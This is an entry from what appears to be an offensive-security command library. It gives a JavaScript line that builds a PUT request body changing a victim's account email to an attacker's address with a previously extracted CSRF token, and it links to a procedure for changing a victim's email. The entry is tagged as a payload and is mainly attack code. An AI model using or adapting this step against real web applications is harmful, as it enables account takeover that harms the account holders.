---
data: >-
  var body = "_method=PUT&email=" + encodeURIComponent(change_email_to) +
  "&authenticity_token=" + encodeURIComponent(csrf);
tags:
  - javascript
  - payload
type: command
executor: javascript
platforms:
  - Web
id: 27391b7f-a168-4384-9ce6-d2fbab7a9d48
created_at: '2025-12-13T09:00:34.441Z'
updated_at: '2025-12-13T09:00:34.441Z'
verified: false
validated: true
submitted: true
---
# Construct Email Change Body

## Command

```javascript
var body = "_method=PUT&email=" + encodeURIComponent(change_email_to) + "&authenticity_token=" + encodeURIComponent(csrf);
```

## Description

Constructs the request body for email change.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `email` | Attacker's email | Yes |
| `_method` | PUT | Yes |
| `authenticity_token` | Extracted CSRF | Yes |

## Examples

### Basic Usage

```javascript
var body = "_method=PUT&email=" + encodeURIComponent('attacker@example.com') + "&authenticity_token=" + encodeURIComponent('token');
```

## Expected Output

Form-encoded string

## Related

- [[procedures/Change-Victim-Email-Using-Extracted-CSRF]]
